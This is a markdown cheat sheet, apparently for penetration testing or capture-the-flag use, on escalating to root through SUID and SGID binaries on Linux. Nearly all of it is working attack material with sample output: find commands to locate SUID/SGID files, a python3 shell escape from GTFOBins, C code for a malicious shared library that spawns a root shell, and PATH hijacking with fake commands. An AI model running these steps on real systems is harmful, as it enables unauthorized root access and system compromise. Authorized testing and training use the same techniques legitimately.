# SUID / SGID BINARIES

### Find SUID binaries

Binaries that run as owner (often root) — Custom/unusual SUID = exploit

```bash
find / -perm -4000 -type f 2>/dev/null
```

<details>
<summary>Example Output</summary>

```
find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec     <- PwnKit!
/opt/custom_app     <- non-standard SUID!
(Focus on non-standard binaries)
```
</details>

---

### Find SGID binaries

Binaries that run as group — Less common but still useful

```bash
find / -perm -2000 -type f 2>/dev/null
```

<details>
<summary>Example Output</summary>

```
find / -perm -2000 -type f 2>/dev/null
/usr/bin/wall
/usr/bin/crontab
/opt/custom_tool  <- non-standard!
(SGID runs as group owner, check for abuse)
```
</details>

---

### GTFOBins SUID lookup

Known SUID abuses — Ignore standard ones like sudo, passwd

```bash
Search each unusual SUID binary on GTFOBins
```

<details>
<summary>Example Output</summary>

```
SUID: /usr/bin/python3

GTFOBins SUID section:
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# whoami
root
(SUID python = instant root)
```
</details>

---

### SUID shared library hijack

If SUID binary loads missing library — Write library to writable path

```bash
strace <suid_binary> 2>&1 | grep 'No such file'
Create missing .so with malicious code
```

<details>
<summary>Example Output</summary>

```
strace /opt/custom_suid 2>&1 | grep 'No such file'
open("/tmp/libcustom.so", O_RDONLY) = -1 ENOENT

Compile malicious libcustom.so:
#include<stdlib.h>
void _init(){ system("/bin/bash -p"); }

gcc -shared -fPIC -o /tmp/libcustom.so lib.c
/opt/custom_suid
# whoami
root
```
</details>

---

### SUID PATH abuse

Hijack relative command calls — Binary runs your fake command as root

```bash
If SUID binary calls commands without full path:
echo '/bin/bash' > /tmp/command
chmod +x /tmp/command
PATH=/tmp:$PATH <suid_binary>
```

<details>
<summary>Example Output</summary>

```
/opt/custom_app calls 'service apache2 start' without full path

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
PATH=/tmp:$PATH /opt/custom_app

# whoami
root
```
</details>

---

### SUID binary version exploits

Outdated binaries with CVEs — Especially custom compiled ones

```bash
Check version of each SUID binary
```

<details>
<summary>Example Output</summary>

```
/opt/custom_v1.2 has SUID
Google: 'custom_app v1.2 exploit'
Exploit-DB: Buffer overflow in v1.2
(Custom compiled SUID binaries are prime targets)
```
</details>

---
